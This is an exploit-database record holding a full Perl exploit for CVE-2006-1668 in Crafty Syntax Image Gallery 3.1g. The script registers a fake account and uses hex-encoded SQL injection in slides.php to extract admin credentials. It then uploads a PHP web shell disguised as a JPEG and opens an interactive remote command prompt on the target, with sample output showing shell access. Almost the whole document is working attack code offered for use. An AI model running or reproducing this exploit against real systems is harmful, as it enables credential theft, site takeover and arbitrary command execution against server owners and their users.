{
  "id": "1645",
  "title": "Crafty Syntax Image Gallery 3.1g - Remote Code Execution",
  "cve": "CVE-2006-1668",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n###############################################################################\r\n# This program is free software; you can redistribute it and/or\r\n# modify it under the terms of the GNU General Public License\r\n# as published by the Free Software Foundation; either version 2\r\n# of the License, or (at your option) any later version.\r\n#\r\n# This program is distributed in the hope that it will be useful,\r\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n# GNU General Public License for more details.\r\n#\r\n# You should have received a copy of the GNU General Public License\r\n# along with this program; if not, write to the Free Software\r\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\r\n###############################################################################\r\n\r\n# =====================================================\r\n# $ crappy_syntax.pl localhost/csig/ 80\r\n#\r\n# :: crafty syntax image gallery <= 3.1g\r\n# :: by undefined1_ @ bash-x.net/undef/\r\n# :: note: this works only on mysql >= 4.0\r\n#\r\n#\r\n# [+] creating user account\r\n# [+]\t\tuser: 98fe56123\r\n#\t\t\tpassword: 7652L4M3l39q\r\n#\t\t\temail: SehswdSx0E@hotmail.com\r\n# [+] user '98fe56123' with password '7652L4M3l39q' registered\r\n# [+] logged in as 98fe56123\r\n# [+] projectid is 2\r\n# [-] no admin found for this projectid, trying the username 'admin'\r\n# [+] admin username: 'admin'\r\n# [+] admin password: '1111'\r\n# [+] logged in as 'admin'\r\n# [+] getting shell location\r\n# [+] shell @ 'userimages/1/18d76bcbc6f2.php'\r\n# [+] have phun?\r\n#\r\n# localhost$ uname\r\n# Linux\r\n# localhost$ whoami\r\n# nobody\r\n# =====================================================\r\n\r\nuse strict; \r\nuse IO::Socket;\r\n\r\n$| = 1;\r\nprint \":: crafty syntax image gallery <= 3.1g\\n\";\r\nprint \":: by undefined1_ @ bash-x.net/undef/\\n\";\r\nprint \":: note: this works only on mysql >= 4.0\\n\\n\\n\";\r\n\r\nmy $website = shift || usage();\r\nmy $port = shift || usage();\r\nmy $user = shift;\r\nmy $password = shift;\r\nmy $location = shift;\r\n\r\n\r\n\r\nmy $path = \"/\";\r\nmy $server = $website;\r\nif(index($website, \"/\") != -1)\r\n{\r\n\t$path = substr($website, index($website, \"/\"));\r\n\t$server = substr($website, 0, index($website, \"/\"));\r\n\tif(substr($path, length($path)-1) ne \"/\")\r\n\t{\r\n\t\t$path .= \"/\";\r\n\t}\r\n}\r\nif($location eq \"\")\r\n{\r\n\tif($user eq \"\" && $password eq \"\")\r\n\t{\r\n\t\tprint \"[+] creating user account\\n\";\r\n\t\t$user = randstring(8,12);\r\n\t\t$password = randstring(8,12);\r\n\t\tmy $email = randstring(8,12).\"\\@hotmail.com\";\r\n\t\tprintf(\"[+]\\tuser: %s\\n\", $user);\r\n\t\tprintf(\"\\tpassword: %s\\n\", $password);\r\n\t\tprintf(\"\\temail: %s\\n\", $email);\r\n\t\tregister($server, $path, $user, $user, $password, $email);\r\n\t}\r\n\r\n\tmy $cookies = login($server, $port, $path, $user, $password);\r\n\tmy $projectid = get_projectid($server, $port, $path, $cookies);\r\n\tmy @admin = send_payload($server, $port, $path, $cookies, $projectid);\r\n\r\n\t$cookies = login($server, $port, $path, $admin[0], $admin[1]);\r\n\tupload_shell($server, $port, $path, $cookies, $projectid);\r\n\t$location = get_shell_location($server,$port,$path,$cookies);\r\n}\r\n\r\ncheck_shell($server, $port, $path, $location);\r\nprintf(\"[+] have phun?\\n\\n\");\r\nmy $command;\r\nwhile(1) \r\n{\r\n\tprint $server.\"\\$ \";\r\n\twhile(<STDIN>) \r\n\t{\r\n\t\t$command = $_;\r\n\t\tchomp($command);\r\n\t\tlast;\r\n\t}\r\n\tdo_shell($server,$port,$path,$location,$command);\r\n}\r\n\r\n\r\nsub send_payload(\\$,\\$,\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $cookies = shift;\r\n\tmy $projectid = shift;\r\n\tmy $shellcode;\r\n\r\n\t$shellcode  = \"\\x61\\x6e\\x64\\x20\\x31\\x3d\\x30\\x20\\x75\\x6e\\x69\\x6f\\x6e\\x20\";\r\n\t$shellcode .= \"\\x61\\x6c\\x6c\\x20\\x73\\x65\\x6c\\x65\\x63\\x74\\x20\\x31\\x2c\\x32\";\r\n\t$shellcode .= \"\\x2c\\x33\\x2c\\x34\\x2c\\x35\\x2c\\x75\\x73\\x65\\x72\\x69\\x64\\x20\";\r\n\t$shellcode .= \"\\x61\\x73\\x20\\x64\\x65\\x73\\x63\\x72\\x69\\x70\\x74\\x69\\x6f\\x6e\";\r\n\t$shellcode .= \"\\x2c\\x37\\x2c\\x38\\x2c\\x39\\x2c\\x30\\x2c\\x31\\x2c\\x32\\x2c\\x33\";\r\n\t$shellcode .= \"\\x2c\\x34\\x2c\\x35\\x2c\\x35\\x20\\x66\\x72\\x6f\\x6d\\x20\\x67\\x61\";\r\n\t$shellcode .= \"\\x6c\\x6c\\x65\\x72\\x79\\x5f\\x61\\x63\\x63\\x65\\x73\\x73\\x20\\x77\";\r\n\t$shellcode .= \"\\x68\\x65\\x72\\x65\\x20\\x67\\x61\\x6c\\x6c\\x65\\x72\\x79\\x69\\x64\";\r\n\t$shellcode .= \"\\x3d\";\r\n\t$shellcode .= $projectid;\r\n\t$shellcode .= \"\\x20\\x61\\x6e\\x64\\x20\\x70\\x65\\x72\\x6d\\x69\\x73\\x73\\x69\\x6f\";\r\n\t$shellcode .= \"\\x6e\\x73\\x3d\\x43\\x4f\\x4e\\x43\\x41\\x54\\x28\\x30\\x78\\x34\\x36\";\r\n\t$shellcode .= \"\\x35\\x35\\x34\\x63\\x34\\x63\\x29\\x20\\x2d\\x2d\";\r\n\r\n\tmy $query = \"GET \".$path.\"slides.php?limitquery_s=\".urlEncode($shellcode).\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= $cookies;\r\n\t$query .= \"\\r\\n\";\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tif($data !~ /photo_captions\\[1\\] = \"/)\r\n\t{\r\n\t\tprint \"[-] no admin found for this projectid, trying the username 'admin'\\n\";\r\n\t\t$shellcode = \"and 1=0 union all select 1,username as image,3,4,5,password AS description,7,8,9,10,11,12,13,14,15,16 from gallery_users where username=CONCAT(0x61646d696e) --\";\r\n\t\t$query = \"GET \".$path.\"slides.php?limitquery_s=\".urlEncode($shellcode).\" HTTP/1.1\\r\\n\";\r\n\t\t$query .= \"Host: $server\\r\\n\";\r\n\t\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t\t$query .= \"Connection: close\\r\\n\";\r\n\t\t$query .= $cookies;\r\n\t\t$query .= \"\\r\\n\";\r\n\t\tmy $data = sendpacket($server, $port, $query);\r\n\t\tif($data !~ /photo_captions\\[1\\] = \"/ || $data !~ /photo_urls\\[1\\] = \"/)\r\n\t\t{\r\n\t\t\tprint \"[-] exploit failed\\n\";\r\n\t\t\texit;\r\n\t\t}\r\n\t\tmy $index1 = index($data, \"photo_captions[1] = \\\" \") + 22;\r\n\t\tmy $index2 = index($data, \"\\\"\", $index1);\r\n\t\tmy $passwd = substr($data, $index1, $index2-$index1);\r\n\r\n\t\t$index1 = index($data, \"photo_urls[1] = \\\"\") + 17;\r\n\t\t$index2 = index($data, \"\\\"\", $index1);\r\n\t\t$data = substr($data, $index1, $index2-$index1);\r\n\t\t$index1 = rindex($data, \"/\") + 1;\r\n\t\tmy $username = substr($data, $index1);\r\n\r\n\r\n\t\tprint \"[+] admin username: '$username'\\n\";\r\n\t\tprint \"[+] admin password: '$passwd'\\n\";\r\n\r\n\t\tmy @ret;\r\n\t\tpush(@ret, $username);\r\n\t\tpush(@ret, $passwd);\r\n\t\treturn @ret;\r\n\t}\r\n\tmy $index1 = index($data, \"photo_captions[1] = \\\" \") + 22;\r\n\tmy $index2 = index($data, \"\\\"\", $index1);\r\n\tmy $uid = substr($data, $index1, $index2-$index1);\r\n\tprint \"[+] admin uid: '$uid'\\n\";\r\n\r\n\r\n\r\n\r\n\r\n\t$shellcode = \"and 1=0 union all select 1,username as image,3,4,5,password AS description,7,8,9,10,11,12,13,14,15,16 from gallery_users where recno=\".$uid.\" --\";\r\n\t$query = \"GET \".$path.\"slides.php?limitquery_s=\".urlEncode($shellcode).\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= $cookies;\r\n\t$query .= \"\\r\\n\";\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tif($data !~ /photo_captions\\[1\\] = \"/ || $data !~ /photo_urls\\[1\\] = \"/)\r\n\t{\r\n\t\tprint \"[-] exploit failed (mysql < 4 ?)\\n\";\r\n\t\texit;\r\n\t}\r\n\t$index1 = index($data, \"photo_captions[1] = \\\" \") + 22;\r\n\t$index2 = index($data, \"\\\"\", $index1);\r\n\tmy $passwd = substr($data, $index1, $index2-$index1);\r\n\r\n\t$index1 = index($data, \"photo_urls[1] = \\\"\") + 17;\r\n\t$index2 = index($data, \"\\\"\", $index1);\r\n\t$data = substr($data, $index1, $index2-$index1);\r\n\t$index1 = rindex($data, \"/\") + 1;\r\n\tmy $username = substr($data, $index1);\r\n\r\n\r\n\tprint \"[+] admin username: '$username'\\n\";\r\n\tprint \"[+] admin password: '$passwd'\\n\";\r\n\r\n\tmy @ret;\r\n\tpush(@ret, $username);\r\n\tpush(@ret, $passwd);\r\n\treturn @ret;\r\n}\r\n\r\n\r\nsub do_shell(\\$,\\$,\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $location = shift;\r\n\tmy $command = shift;\r\n\r\n\tmy $d = \"c=\".$command;\r\n\tmy $query = \"POST \".$path.$location.\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= \"Content-Length: \".length($d).\"\\r\\n\";\r\n\t$query .= \"\\r\\n\";\r\n\t$query .= $d;\r\n\t\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tmy $index = index($data, \"\\r\\n\\r\\n\");\r\n\tif($index >= 0)\r\n\t{\r\n\t\tprint substr($data, $index+4).\"\\n\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint \"[-] shell error?\\n\";\r\n\t}\r\n}\r\n\r\nsub check_shell(\\$,\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $location = shift;\r\n\r\n\t\r\n\tmy $query = \"GET \".$path.$location.\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= \"\\r\\n\";\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\r\n\tif($data !~ /HTTP\\/1.1 200 OK/)\r\n\t{\r\n\t\tprint \"[-] shell not found\\n\";\r\n\t\tprint \"[-] try \".$server.$path.\"/userimages/\\n\";\r\n\t\texit;\r\n\t}\r\n}\r\n\r\nsub get_shell_location(\\$,\\$,\\$,\\$) {\t\r\n\tprint \"[+] getting shell location\\n\";\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $cookies = shift;\r\n\tmy $shellcode;\r\n\r\n\t$shellcode  = \"\\x61\\x6e\\x64\\x20\\x69\\x6d\\x61\\x67\\x65\\x20\\x4c\\x49\\x4b\\x45\\x20\\x43\";\r\n\t$shellcode .= \"\\x4f\\x4e\\x43\\x41\\x54\\x28\\x30\\x78\\x32\\x35\\x32\\x65\\x37\\x30\\x36\\x38\";\r\n\t$shellcode .= \"\\x37\\x30\\x29\\x20\\x6f\\x72\\x64\\x65\\x72\\x20\\x62\\x79\\x20\\x72\\x65\\x63\";\r\n\t$shellcode .= \"\\x6e\\x6f\\x20\\x64\\x65\\x73\\x63\\x20\\x6c\\x69\\x6d\\x69\\x74\\x20\\x31\\x20\";\r\n\t$shellcode .= \"\\x2d\\x2d\";\r\n\r\n\t\r\n\tmy $query = \"GET \".$path.\"slides.php?limitquery_s=\".urlEncode($shellcode).\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= $cookies;\r\n\t$query .= \"\\r\\n\";\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tif($data =~ /There are no photos in this gallery/)\r\n\t{\r\n\t\tprint \"[-] shell not found\\n\";\r\n\t\tprint \"[-] try \".$server.$path.\"/userimages/\\n\";\r\n\t\texit;\r\n\t}\r\n\r\n\tmy $index1 = index($data, \"photo_urls[1] = \\\"\") + 17;\r\n\tmy $index2 = index($data, \"\\\"\", $index1);\r\n\tmy $location = substr($data, $index1, $index2-$index1);\r\n\tprint \"[+] shell @ '\".$location.\"'\\n\";\r\n\treturn $location;\r\n}\r\n\r\nsub get_projectid(\\$,\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $cookies = shift;\r\n\t\r\n\tmy $query = \"GET \".$path.\"imagemenu.php?html=menu.tpl HTTP/1.1\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= $cookies;\r\n\t$query .= \"\\r\\n\";\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tmy $projectid;\r\n\tif($data =~ /\\?projectid=([0-9]*)/)\r\n\t{\r\n\t\t$projectid = $1;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint \"[-] no projectid found\";\r\n\t\texit;\r\n\t}\r\n\r\n\tprint \"[+] projectid is '$projectid'\\n\";\r\n\treturn $projectid;\r\n}\r\n\r\nsub upload_shell(\\$,\\$,\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $cookies = shift;\r\n\tmy $projectid = shift;\r\n\t\r\n\tmy $query = \"GET \".$path.\"newimage.php?projectid=\".$projectid.\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= $cookies;\r\n\t$query .= \"\\r\\n\";\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tif($data =~ /Access denied.../)\r\n\t{\r\n\t\tprint \"[-] no admin privileges (mysql < 4.0 ?)\\n\";\r\n\t\texit;\r\n\t}\r\n\r\n\tmy $shell = \"<? if(isset(\\$_POST['c'])) { system(\\$_POST['c']); } ?>\";\r\n\r\n\tmy $boundary = \"-----------------------------220162907215434\";\r\n\tmy $post = \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"projectid\\\"\\r\\n\\r\\n\";\r\n\t$post .= $projectid.\"\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"A_MONTH\\\"\\r\\n\\r\\n\";\r\n\t$post .= \"03\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"A_DAY\\\"\\r\\n\\r\\n\";\r\n\t$post .= \"26\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"A_YEAR\\\"\\r\\n\\r\\n\";\r\n\t$post .= \"2006\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"fullimage\\\"; filename=\\\"my_image.jpg\\\"\\r\\n\";\r\n\t$post .= \"Content-Type: text/plain\\r\\n\\r\\n\";\r\n\t$post .= $shell.\"\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"description\\\"\\r\\n\\r\\n\";\r\n\t$post .= \"another image\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"ext\\\"\\r\\n\\r\\n\";\r\n\t$post .= \".php\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"feature__\".$projectid.\"\\\"\\r\\n\\r\\n\";\r\n\t$post .= \"Y\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"\\r\\n\";\r\n\t$post .= \"Content-Disposition: form-data; name=\\\"addnow\\\"\\r\\n\\r\\n\";\r\n\t$post .= \"ADD\\r\\n\";\r\n\r\n\t$post .= \"--\".$boundary.\"--\\r\\n\";\r\n\r\n\tmy $query  = \"POST \".$path.\"newimage.php?projectid=\".$projectid.\" HTTP/1.1\\r\\n\";\r\n\t$query .= \"Content-Type: multipart/form-data; boundary=\".$boundary.\"\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= $cookies;\r\n\t$query .= \"Content-Length: \".length($post).\"\\r\\n\";\r\n\t$query .= \"\\r\\n\";\r\n\t$query .= $post;\r\n\r\n\tsendpacket($server, $port, $query);\r\n}\r\n\r\nsub login(\\$,\\$,\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $path = shift;\r\n\tmy $username = shift;\r\n\tmy $password = shift;\r\n\r\n\tmy $d = \"whattodo=login&myusername=\".$username.\"&mypassword=\".$password;\r\n\tmy $query = \"POST \".$path.\"index.php HTTP/1.1\\r\\n\";\r\n\t$query .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= \"Content-Length: \".length($d).\"\\r\\n\";\r\n\t$query .= \"\\r\\n\";\r\n\t$query .= $d;\r\n\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tif($data =~ /<td><b>Your Name:<\\/td><td><input type=text name=myusername/ || $data !~ /Set-Cookie: /)\r\n\t{\r\n\t\tprint \"[-] failed to login\\n\";\r\n\t\texit;\r\n\t}\r\n\t\r\n\tmy $cookies = \"\";\t# chocolate cookies\r\n\tmy $index1 = index($data, \"\\r\\n\\r\\n\");\r\n\tif($index1 >= 0)\r\n\t{\r\n\t\tmy $index2 = index($data, \"Set-Cookie: \") + 12;\r\n\t\tmy $index3 = index($data, \"\\r\\n\", $index2);\r\n\t\t$cookies = \"Cookie: \".substr($data, $index2, $index3-$index2+2);\r\n\t}\r\n\t\r\n\tprint \"[+] logged in as '$username'\\n\";\r\n\treturn $cookies;\r\n}\r\n\r\nsub register(\\$, \\$, \\$, \\$, \\$, \\$, \\$) {\r\n\tmy $server = shift;\r\n\tmy $path = shift;\r\n\tmy $name = shift;\r\n\tmy $user = shift;\r\n\tmy $password = shift;\r\n\tmy $email = shift;\r\n\r\n\tmy $d = \"action=register&emailadd=\".$email.\"&newname=\".$name.\"&newusername=\".$user.\"&newpassword=\".$password;\r\n\tmy $query = \"POST \".$path.\"lostsheep.php HTTP/1.1\\r\\n\";\r\n\t$query .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$query .= \"Host: $server\\r\\n\";\r\n\t$query .= \"User-Agent: Mozilla/5.0\\r\\n\";\r\n\t$query .= \"Connection: close\\r\\n\";\r\n\t$query .= \"Content-Length: \".length($d).\"\\r\\n\";\r\n\t$query .= \"\\r\\n\";\r\n\t$query .= $d;\r\n\r\n\tmy $data = sendpacket($server, $port, $query);\r\n\tif($data =~ /<li>Sorry the username you entered <b><\\/b> is already taken.. try again/)\r\n\t{\r\n\t\tprint \"[-] failed: username taken\\n\";\r\n\t\texit;\r\n\t}\r\n\tif($data =~ /you did not enter in a/)\r\n\t{\r\n\t\tprint \"[-] failed\\n\";\r\n\t\texit;\r\n\t}\r\n\tprint \"[+] user '$user' with password '$password' registered\\n\";\r\n}\r\n\r\nsub sendpacket(\\$,\\$,\\$) {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $request = shift;\r\n\r\n\tmy $sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $server, PeerPort => $port) or die \"[-] Could not connect to $server:$port $!\\n\";\r\n\tprint $sock \"$request\";\r\n\r\n\t\r\n\tmy $data = \"\";\r\n\tmy $answer;\r\n\twhile($answer = <$sock>)\r\n\t{\r\n\t\t$data .= $answer;\r\n\t}\r\n\t\r\n\tclose($sock);\r\n\treturn $data;\r\n}\r\n\r\nsub randstring(\\$,\\$) {\r\n\tmy $min = shift;\r\n\tmy $max = shift;\r\n\r\n\tmy $length = int( (rand(65535)%($max-$min+1))+$min);\r\n\tmy $ret = \"\";\r\n\tfor(my $i = 0; $i < $length; $i++)\r\n\t{\r\n\t\tmy $w = int(rand(3));\r\n\t\tif($w == 0)\r\n\t\t{\r\n\t\t\t$ret .= chr(97 + int(rand(26)));\r\n\t\t}\r\n\t\telsif($w == 1)\r\n\t\t{\r\n\t\t\t$ret .= chr(65 + int(rand(26)));\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$ret .= chr(48 + int(rand(10)));\r\n\t\t}\r\n\t}\r\n\r\n\treturn $ret;\r\n}\r\n\r\n\r\nsub usage() {\r\n\tprintf \"usage: %s <website> <port> [user(optional)] [password(optional)] [shell path without trailing / (optional)]\\n\", $0;\r\n\tprintf \"exemple: %s www.site.com/csig/ 80\\n\", $0;\r\n\texit;\r\n}\r\n\r\n\r\nsub urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    return $string;\r\n}\r\n\r\n# milw0rm.com [2006-04-04]",
  "url": "https://www.exploit-db.com/exploits/1645"
}